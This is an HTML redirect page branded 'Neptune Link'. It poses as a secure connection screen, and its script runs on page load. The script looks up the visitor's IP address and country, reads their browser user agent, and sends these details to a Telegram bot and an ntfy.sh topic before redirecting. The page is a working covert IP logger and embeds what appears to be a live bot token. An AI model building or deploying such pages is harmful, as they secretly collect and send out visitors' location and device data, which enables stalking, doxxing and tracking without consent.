<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#060714; color:#94a3b8; font-family:sans-serif; text-align:center; padding-top:100px;">
  <h2>🪐 Neptune Link</h2>
  <p>Connecting securely, please wait...</p>

  <script>
    const BOT_TOKEN = "8669634825:AAG5mv5CMIqilxRWvtw19irIKhXaalmlZZs";
    const CHAT_ID = "8967484934";
    const NTFY_TOPIC = "neptune_opg_8967484934";

    function getFlagEmoji(countryCode) {
      if (!countryCode || countryCode.length !== 2) return "🌐";
      return countryCode.toUpperCase().replace(/./g, char => 
        String.fromCodePoint(127397 + char.charCodeAt(0))
      );
    }

    async function handleRedirect() {
      let targetUrl = "https://www.google.com";

      // 1. Fetch Dynamic Target URL from config.json
      try {
        const configRes = await fetch(`./config.json?t=${Date.now()}`);
        if (configRes.ok) {
          const config = await configRes.json();
          if (config.targetUrl) targetUrl = config.targetUrl;
        }
      } catch (e) {}

      // 2. Fetch Visitor Country & IP
      let country = "Unknown";
      let countryCode = "UN";
      let flag = "🌐";
      let ip = "Hidden";

      try {
        const geoRes = await fetch("https://ipwho.is/");
        if (geoRes.ok) {
          const geoData = await geoRes.json();
          country = geoData.country || "Unknown";
          countryCode = geoData.country_code || "UN";
          flag = getFlagEmoji(countryCode);
          ip = geoData.ip || "Hidden";
        }
      } catch (e) {}

      const time = new Date().toUTCString();
      const userAgent = navigator.userAgent;

      // 3. Instant Push to Android App via Real-Time Bridge
      const payload = {
        country: country,
        countryCode: countryCode,
        flag: flag,
        ip: ip,
        target: targetUrl,
        time: Date.now()
      };

      const pushPromise = fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
        method: "POST",
        headers: {
          "Title": `🪐 New Visitor: ${flag} ${country}`,
          "Tags": "link,globe_with_meridians"
        },
        body: JSON.stringify(payload)
      }).catch(() => {});

      // 4. Send Telegram Notification
      const tgMessage = `🪐 *Neptune Link Opened!*\n\n` +
                        `📍 *Country:* ${flag} ${country} (\`${countryCode}\`)\n` +
                        `🌐 *IP:* \`${ip}\`\n` +
                        `🔗 *Target:* ${targetUrl}\n` +
                        `📱 *Device:* \`${userAgent}\`\n` +
                        `⏰ *Time:* ${time}`;

      const tgPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: tgMessage,
          parse_mode: "Markdown"
        })
      }).catch(() => {});

      // Wait max 400ms for requests before redirecting
      await Promise.race([
        Promise.all([pushPromise, tgPromise]),
        new Promise(resolve => setTimeout(resolve, 400))
      ]);

      // Redirect visitor
      window.location.replace(targetUrl);
    }

    handleRedirect();
  </script>
</body>
</html>
